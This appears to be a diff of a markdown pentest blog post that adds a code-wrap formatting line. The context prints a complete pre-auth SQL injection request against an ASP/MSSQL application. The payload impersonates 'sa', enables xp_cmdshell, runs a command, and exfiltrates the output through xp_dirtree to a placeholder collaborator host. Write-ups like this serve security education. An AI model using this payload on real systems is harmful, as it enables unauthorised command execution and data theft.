@@ -10,6 +10,7 @@ I recently escalated a preauth SQL injection on an ASP app sitting on top of MSS
 ```http
 GET /app/search/query.asp?filter=1;EXEC+AS+LOGIN='sa';EXEC+sp_configure+'xp_cmdshell',1;RECONFIGURE;CREATE+TABLE+%23tmp(col+VARCHAR(999));INSERT+%23tmp+EXEC+master..xp_cmdshell+'whoami';DECLARE+@a+VARCHAR(999),@b+VARCHAR(999);SELECT+TOP+1+@a=REPLACE(REPLACE(SUBSTRING(col,1,10),CHAR(92),'-'),CHAR(32),'-')+FROM+%23tmp+WHERE+col+IS+NOT+NULL;SET+@b=CONCAT(CHAR(92),CHAR(92),@a,'.yourcollaboratorendpoint',CHAR(92),'x');EXEC+master..xp_dirtree+@b;DROP+TABLE+%23tmp;EXEC+sp_configure+'xp_cmdshell',0;RECONFIGURE;REVERT;SELECT+modified,client_id,contact+FROM+orders+o+WHERE+1=1+and+1=1+and+1=1+and+1=1 HTTP/2
 ```
+{: .code-wrap }
 
 Ugly? Yep. But *it werks*. Let's break it down step by step:
 
